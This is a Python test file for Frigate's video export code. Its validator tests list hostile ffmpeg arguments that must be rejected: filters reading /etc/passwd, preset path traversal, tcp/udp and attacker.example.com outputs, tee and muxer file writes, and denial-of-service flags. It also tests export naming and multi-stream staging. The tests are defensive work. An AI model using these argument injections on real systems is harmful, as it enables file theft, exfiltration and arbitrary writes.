import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from frigate.api.export import _unique_archive_name
from frigate.const import MAX_PLAYLIST_SECONDS
from frigate.models import Export
from frigate.record.export import (
    EXPORT_TRACK_TIMESCALE,
    PlaybackSourceEnum,
    RecordingExporter,
    StreamRun,
    export_video_path,
    validate_ffmpeg_args,
)


class TestValidateFfmpegArgs(unittest.TestCase):
    """Tests for the non-admin custom export ffmpeg arg validator.

    The validator uses a structural allowlist: every token must be an
    allowlisted flag or the value of one, filter values are restricted to a
    safe set of filters, and no token may become a bare input/output URL.
    """

    def assertRejected(self, args: str) -> None:
        valid, message = validate_ffmpeg_args(args)
        self.assertFalse(valid, f"expected {args!r} to be rejected")
        self.assertNotEqual(message, "")

    def assertAllowed(self, args: str) -> None:
        valid, message = validate_ffmpeg_args(args)
        self.assertTrue(valid, f"expected {args!r} to be allowed, got: {message}")
        self.assertEqual(message, "")

    # --- legitimate use cases must keep working ---------------------------

    def test_timelapse_setpts_allowed(self):
        # The whole reason -vf cannot simply be blocked: timelapse exports.
        self.assertAllowed("-vf setpts=PTS/60 -r 25")
        self.assertAllowed("-vf setpts=0.04*PTS -r 30")  # server default
        self.assertAllowed("-filter:v setpts=PTS/60 -r 25")

    def test_default_input_args_allowed(self):
        self.assertAllowed("")
        self.assertAllowed("-an -skip_frame nokey")

    def test_encoding_args_allowed(self):
        self.assertAllowed("-c:v libx264 -crf 23 -preset fast")
        self.assertAllowed("-c:v copy -c:a copy")
        self.assertAllowed("-c:v libx264 -b:v 2M -maxrate 2M -bufsize 4M")
        self.assertAllowed("-movflags +faststart")
        self.assertAllowed("-pix_fmt yuv420p -r 30 -g 30")

    def test_safe_filters_allowed(self):
        self.assertAllowed("-vf scale=640:480")
        self.assertAllowed("-vf scale=640:480,setpts=0.5*PTS")
        self.assertAllowed("-vf format=yuv420p")
        self.assertAllowed("-vf transpose=1")
        self.assertAllowed("-vf hflip")
        self.assertAllowed("-vf fps=15")
        self.assertAllowed("-vf setsar=1 -an")
        self.assertAllowed("-vf setdar=16/9")

    # --- the reported advisory and file-read class ------------------------

    def test_reported_advisory_rejected(self):
        self.assertRejected(
            "-filter:v drawtext=textfile=/etc/passwd:fontcolor=white:fontsize=20"
        )

    def test_file_reading_filters_rejected(self):
        self.assertRejected("-vf movie=/etc/passwd")
        self.assertRejected("-vf drawtext=textfile=/etc/passwd")
        self.assertRejected("-vf subtitles=/etc/passwd")
        # marker embedded as an option of an otherwise-allowed filter name
        self.assertRejected("-vf scale=movie=/etc/passwd")

    def test_filtergraph_brackets_rejected(self):
        # link labels aren't needed for safe filters; rejecting "[" / "]" keeps
        # filtergraph validation linear (no ReDoS on attacker input)
        self.assertRejected("-vf [in]scale=640:480[out]")
        self.assertRejected("-vf " + "[" * 5000)

    def test_preset_file_read_rejected(self):
        # cwd-anchored traversal slipped past the old startswith() path check
        self.assertRejected("-fpre frigate/../../../etc/passwd")
        self.assertRejected("-fpre evil.preset")
        self.assertRejected("-vpre x")
        self.assertRejected("-apre x")
        self.assertRejected("-pre x")

    def test_slash_option_file_read_rejected(self):
        # ffmpeg "-/option file" reads the option value from a file
        self.assertRejected("-/filter:v graph.txt")
        self.assertRejected("-/filter_complex graph.txt")

    # --- network / SSRF class ---------------------------------------------

    def test_schemeless_protocol_rejected(self):
        self.assertRejected("-f mpegts tcp:10.0.0.5:4444")
        self.assertRejected("tcp:10.0.0.5:4444")
        self.assertRejected("udp:10.0.0.5:4444")
        self.assertRejected("-progress http:attacker.example.com:80/p")

    # --- file-write class --------------------------------------------------

    def test_tee_write_rejected(self):
        self.assertRejected("-c:v libx264 -map 0 -f tee [f=mpegts]/tmp/owned.ts")
        self.assertRejected("-f tee [f=mpegts]/etc/frigate/x.ts")
        self.assertRejected("tee:/tmp/x")

    def test_bare_output_token_rejected(self):
        self.assertRejected("evil.mp4")
        self.assertRejected("-c copy evil.mp4")
        self.assertRejected("x/../escaped.mkv")

    def test_file_producing_muxers_rejected(self):
        self.assertRejected("-f hls -hls_segment_filename pwn%03d.ts out.m3u8")
        self.assertRejected("-f md5 victim.txt")
        self.assertRejected("-f segment seg%03d.ts")

    def test_write_flags_rejected(self):
        self.assertRejected("-progress evil.log")
        self.assertRejected("-stats_enc_pre evil.csv")
        self.assertRejected("-report")

    # --- resource exhaustion / misc ---------------------------------------

    def test_dos_input_flags_rejected(self):
        self.assertRejected("-stream_loop -1")
        self.assertRejected("-readrate 0.001")

    def test_disallowed_flags_rejected(self):
        self.assertRejected("-map 0")
        self.assertRejected("-i /etc/passwd")
        self.assertRejected("-attach evil.bin")
        self.assertRejected("-dump_attachment evil.bin")
        self.assertRejected("/etc/passwd")
        self.assertRejected("-metadata comment=x")


class TestExportVideoPath(unittest.TestCase):
    """Tests for the file path an export takes once the user names it."""

    EXPORT_ID = "front_door_abc123"

    def test_uses_the_name_the_user_gave(self):
        self.assertEqual(
            export_video_path("Package thief", self.EXPORT_ID),
            "/media/frigate/exports/Package thief_abc123.mp4",
        )

    def test_id_suffix_keeps_shared_names_apart(self):
        self.assertNotEqual(
            export_video_path("clip", "front_door_abc123"),
            export_video_path("clip", "front_door_def456"),
        )

    def test_long_names_fit_the_filesystem_limit(self):
        # Names are capped in bytes, not characters: 244 CJK characters is
        # under any character cap and still 732 bytes on disk.
        for name in ("A" * 256, "\u76e3" * 256, "\U0001f3a5" * 100):
            file_name = Path(export_video_path(name, self.EXPORT_ID)).name
            self.assertLessEqual(len(file_name.encode()), 255)

    def test_truncation_keeps_the_name_decodable(self):
        file_name = Path(export_video_path("\u76e3" * 256, self.EXPORT_ID)).name
        self.assertTrue(file_name.endswith("_abc123.mp4"))
        self.assertNotIn("\ufffd", file_name)

    def test_stays_inside_the_export_dir(self):
        for name in ("../../etc/passwd", "..", "a/b", "...", ""):
            path = Path(export_video_path(name, self.EXPORT_ID))
            self.assertEqual(str(path.parent), "/media/frigate/exports")


class TestUniqueArchiveName(unittest.TestCase):
    """Tests for zip entry names in a case download.

    Entries use the on-disk file name, which is also what an individual
    download produces, so the two can't drift.
    """

    def build_export(self, video_path: str) -> Export:
        return Export(
            id="front_door_abc123",
            camera="front_door",
            name="whatever the display name is",
            date=1756000000.0,
            video_path=video_path,
            thumb_path=video_path.replace(".mp4", ".webp"),
            in_progress=False,
        )

    def test_uses_the_on_disk_file_name(self):
        export = self.build_export(
            "/media/frigate/exports/front_door_20260823_020615-20260823_020734_abc123.mp4"
        )
        self.assertEqual(
            _unique_archive_name(export, set()),
            "front_door_20260823_020615-20260823_020734_abc123.mp4",
        )

    def test_follows_a_renamed_file(self):
        export = self.build_export("/media/frigate/exports/Package thief_abc123.mp4")
        self.assertEqual(
            _unique_archive_name(export, set()), "Package thief_abc123.mp4"
        )

    def test_entries_are_deduplicated(self):
        export = self.build_export("/media/frigate/exports/Package thief_abc123.mp4")
        used: set[str] = set()
        self.assertEqual(_unique_archive_name(export, used), "Package thief_abc123.mp4")
        self.assertEqual(
            _unique_archive_name(export, used), "Package thief_abc123_1.mp4"
        )


if __name__ == "__main__":
    unittest.main()


class _FakeRow:
    def __init__(self, path: str) -> None:
        self.path = path


def _span(path: str, start: float, end: float, is_main: bool) -> list:
    return [_FakeRow(path), start, end, is_main]


def _make_exporter(spans: list, codecs: set) -> RecordingExporter:
    """Build an exporter with coverage resolution stubbed out.

    Bypasses __init__ so no directories are created and no FrigateConfig
    is required, then pre-seeds the memoized coverage the same shape
    _resolve_coverage would produce.
    """
    exporter = RecordingExporter.__new__(RecordingExporter)
    exporter.config = MagicMock()
    exporter.config.ffmpeg.ffmpeg_path = "ffmpeg"
    exporter.config.networking.listen.internal = 5000
    exporter.config.cameras = {"front": MagicMock()}
    exporter.export_id = "front_abc123"
    exporter.camera = "front"
    exporter.start_time = 1_000
    exporter.end_time = 2_000
    exporter.playback_source = PlaybackSourceEnum.recordings
    exporter.ffmpeg_input_args = None
    exporter.ffmpeg_output_args = None
    exporter.chapters = None
    exporter.staged_runs = []
    exporter.staged_transcode = False
    exporter._coverage = (spans, codecs, False)
    return exporter


class TestStreamRuns(unittest.TestCase):
    """Runs are the largest chunk of an export whose parameter sets hold still."""

    def test_consecutive_spans_of_one_stream_collapse(self) -> None:
        exporter = _make_exporter([], {"h264"})
        runs = exporter._stream_runs(
            [
                _span("/m1.mp4", 1_000, 1_010, True),
                _span("/m2.mp4", 1_010, 1_020, True),
                _span("/s1.mp4", 1_020, 1_030, False),
                _span("/s2.mp4", 1_030, 1_040, False),
                _span("/m3.mp4", 1_040, 1_050, True),
            ]
        )

        self.assertEqual(
            [(r.stream_type, r.start_time, r.end_time) for r in runs],
            [("main", 1_000, 1_020), ("sub", 1_020, 1_040), ("main", 1_040, 1_050)],
        )

    def test_run_keeps_a_sample_path_to_probe(self) -> None:
        exporter = _make_exporter([], {"h264"})
        runs = exporter._stream_runs(
            [
                _span("/m1.mp4", 1_000, 1_010, True),
                _span("/m2.mp4", 1_010, 1_020, True),
            ]
        )

        self.assertEqual(len(runs), 1)
        self.assertEqual(runs[0].sample_path, "/m1.mp4")

    def test_long_runs_are_split_to_playlist_size(self) -> None:
        """One pinned playlist per run still has to fit nginx-vod's clip cap."""
        exporter = _make_exporter([], {"h264"})
        runs = exporter._split_long_run(
            StreamRun("main", 0, MAX_PLAYLIST_SECONDS * 2.5, "/m1.mp4")
        )

        self.assertEqual(len(runs), 3)
        self.assertEqual(runs[0].start_time, 0)
        self.assertEqual(runs[-1].end_time, MAX_PLAYLIST_SECONDS * 2.5)
        # contiguous, no gaps or overlap between the pieces
        for earlier, later in zip(runs, runs[1:]):
            self.assertEqual(earlier.end_time, later.start_time)
        self.assertTrue(all(r.stream_type == "main" for r in runs))

    def test_a_long_single_stream_range_is_not_staged(self) -> None:
        """Length alone is not a hand-off; only a stream change is."""
        exporter = _make_exporter(
            [_span("/m1.mp4", 0, MAX_PLAYLIST_SECONDS * 3, True)], {"h264"}
        )

        with patch.object(RecordingExporter, "_stage_stream_runs") as stage:
            exporter._prepare_stream_runs()

        stage.assert_not_called()

    def test_mixed_range_is_staged(self) -> None:
        exporter = _make_exporter(
            [
                _span("/m1.mp4", 1_000, 1_020, True),
                _span("/s1.mp4", 1_020, 1_040, False),
            ],
            {"h264"},
        )

        with patch.object(RecordingExporter, "_stage_stream_runs") as stage:
            exporter._prepare_stream_runs()

        stage.assert_called_once()
        staged_runs = stage.call_args.args[0]
        self.assertEqual([r.stream_type for r in staged_runs], ["main", "sub"])

    def test_single_stream_range_is_not_staged(self) -> None:
        """The common case must stay on the untouched single-playlist path."""
        exporter = _make_exporter(
            [
                _span("/m1.mp4", 1_000, 1_010, True),
                _span("/m2.mp4", 1_010, 1_020, True),
            ],
            {"h264"},
        )

        with patch.object(RecordingExporter, "_stage_stream_runs") as stage:
            exporter._prepare_stream_runs()

        stage.assert_not_called()
        self.assertEqual(exporter.staged_runs, [])


class TestStageRunCommand(unittest.TestCase):
    """Each run is rendered on its own so its parameter sets travel with it."""

    def _run(self, stream_type: str = "sub") -> StreamRun:
        return StreamRun(stream_type, 1_020.0, 1_040.0, "/media/s1.mp4")

    def test_copy_pins_the_playlist_to_one_stream(self) -> None:
        # the merged /vod route is exactly what breaks: ffmpeg binds the
        # track's parameter sets from the first init segment only
        exporter = _make_exporter([], {"h264"})
        cmd = exporter._stage_run_command(self._run(), "/tmp/s.mp4", None, False)

        self.assertIn(
            "http://127.0.0.1:5000/vod/front/sub/start/1020.0/end/1040.0/index.m3u8",
            cmd,
        )

    def test_copy_forces_a_common_track_timescale(self) -> None:
        # without this a 5fps sub run is replayed at the main stream's rate
        exporter = _make_exporter([], {"h264"})
        cmd = exporter._stage_run_command(self._run(), "/tmp/s.mp4", None, False)

        self.assertEqual(
            cmd[cmd.index("-video_track_timescale") + 1], str(EXPORT_TRACK_TIMESCALE)
        )
        self.assertIn("copy", cmd)
        self.assertEqual(cmd[-1], "/tmp/s.mp4")

    def test_audio_is_dropped_unless_both_streams_agree(self) -> None:
        exporter = _make_exporter([], {"h264"})

        dropped = exporter._stage_run_command(self._run(), "/tmp/s.mp4", None, False)
        kept = exporter._stage_run_command(self._run(), "/tmp/s.mp4", None, True)

        self.assertIn("-an", dropped)
        self.assertNotIn("-an", kept)
        self.assertIn("-c:a", kept)

    def test_audio_codec_is_an_output_option(self) -> None:
        """ "-c:a copy" ahead of -i selects a decoder named copy, which errors."""
        exporter = _make_exporter([], {"h264", "h265"})

        for target in (None, (1920, 1080)):
            cmd = exporter._stage_run_command(self._run(), "/tmp/s.mp4", target, True)
            self.assertGreater(
                cmd.index("-c:a"),
                cmd.index("-i"),
                f"audio codec placed ahead of -i for target={target}",
            )

    def test_scaling_pass_does_not_use_hwaccel(self) -> None:
        # the vaapi/nvidia presets keep frames in GPU memory, out of reach
        # of the software scale/pad filters this pass relies on
        exporter = _make_exporter([], {"h264", "h265"})
        exporter.config.cameras["front"].record.export.hwaccel_args = "preset-vaapi"

        cmd = exporter._stage_run_command(
            self._run(), "/tmp/s.mp4", (1920, 1080), False
        )

        self.assertNotIn("-hwaccel", cmd)
        self.assertIn("libx264", cmd)

    def test_target_scales_and_pads_rather_than_stretching(self) -> None:
        exporter = _make_exporter([], {"h264", "h265"})
        cmd = exporter._stage_run_command(
            self._run(), "/tmp/s.mp4", (1920, 1080), False
        )

        filtergraph = cmd[cmd.index("-vf") + 1]
        self.assertIn(
            "scale=1920:1080:force_original_aspect_ratio=decrease", filtergraph
        )
        self.assertIn("pad=1920:1080", filtergraph)
        self.assertIn("setsar=1", filtergraph)
        self.assertNotIn("copy", cmd)


class TestAudioUniformity(unittest.TestCase):
    """Audio only survives a hand-off when both streams agree on it."""

    def _check(self, summary: dict) -> bool:
        return _make_exporter([], {"h264"})._audio_is_uniform(summary)

    def test_matching_audio_is_kept(self) -> None:
        stream = {"has_audio": True, "audio_codec": "aac", "audio_rate": 48000}
        self.assertTrue(self._check({"main": stream, "sub": dict(stream)}))

    def test_differing_rate_is_dropped(self) -> None:
        self.assertFalse(
            self._check(
                {
                    "main": {
                        "has_audio": True,
                        "audio_codec": "aac",
                        "audio_rate": 48000,
                    },
                    "sub": {
                        "has_audio": True,
                        "audio_codec": "aac",
                        "audio_rate": 16000,
                    },
                }
            )
        )

    def test_audio_on_only_one_stream_is_dropped(self) -> None:
        self.assertFalse(
            self._check(
                {
                    "main": {
                        "has_audio": True,
                        "audio_codec": "aac",
                        "audio_rate": 48000,
                    },
                    "sub": {
                        "has_audio": False,
                        "audio_codec": None,
                        "audio_rate": None,
                    },
                }
            )
        )

    def test_unknown_legacy_audio_is_dropped(self) -> None:
        # NULL means unprobed, not "the same as the other stream"
        self.assertFalse(
            self._check(
                {
                    "main": {
                        "has_audio": None,
                        "audio_codec": None,
                        "audio_rate": None,
                    },
                    "sub": {"has_audio": None, "audio_codec": None, "audio_rate": None},
                }
            )
        )


class TestStagingFailure(unittest.TestCase):
    def test_failed_staging_aborts_rather_than_falling_back(self) -> None:
        """The merged playlist is the thing staging exists to avoid."""
        exporter = _make_exporter(
            [
                _span("/m1.mp4", 1_000, 1_020, True),
                _span("/s1.mp4", 1_020, 1_040, False),
            ],
            {"h264"},
        )

        with patch.object(RecordingExporter, "_stage_stream_runs", return_value=False):
            self.assertFalse(exporter._prepare_stream_runs())

    def test_successful_staging_reports_true(self) -> None:
        exporter = _make_exporter(
            [
                _span("/m1.mp4", 1_000, 1_020, True),
                _span("/s1.mp4", 1_020, 1_040, False),
            ],
            {"h264"},
        )

        with patch.object(RecordingExporter, "_stage_stream_runs", return_value=True):
            self.assertTrue(exporter._prepare_stream_runs())

    def test_single_stream_range_reports_true_without_staging(self) -> None:
        exporter = _make_exporter([_span("/m1.mp4", 1_000, 1_020, True)], {"h264"})

        with patch.object(RecordingExporter, "_stage_stream_runs") as stage:
            self.assertTrue(exporter._prepare_stream_runs())

        stage.assert_not_called()


class TestStagedExportCommand(unittest.TestCase):
    def test_staged_runs_are_concatenated_with_stream_copy(self) -> None:
        exporter = _make_exporter(
            [
                _span("/m1.mp4", 1_000, 1_020, True),
                _span("/s1.mp4", 1_020, 1_040, False),
            ],
            {"h264"},
        )
        exporter.staged_runs = ["/cache/stage_0.mp4", "/cache/stage_1.mp4"]

        cmd, playlist_lines = exporter.get_record_export_command("/exports/out.mp4")

        self.assertEqual(
            playlist_lines,
            ["file '/cache/stage_0.mp4'", "file '/cache/stage_1.mp4'"],
        )
        self.assertIn("concat", cmd)
        self.assertIn("copy", cmd)
        # nothing is left pointing at the merged vod route
        self.assertFalse(any("/vod/front/start/" in token for token in cmd))
        self.assertEqual(cmd[-1], "/exports/out.mp4")

    def test_expected_duration_sums_the_merged_timeline(self) -> None:
        """A mixed range must not be measured by one stream alone."""
        exporter = _make_exporter(
            [
                _span("/m1.mp4", 1_000, 1_020, True),
                _span("/s1.mp4", 1_020, 1_050, False),
            ],
            {"h264"},
        )

        self.assertEqual(exporter._expected_output_duration_seconds(), 50.0)
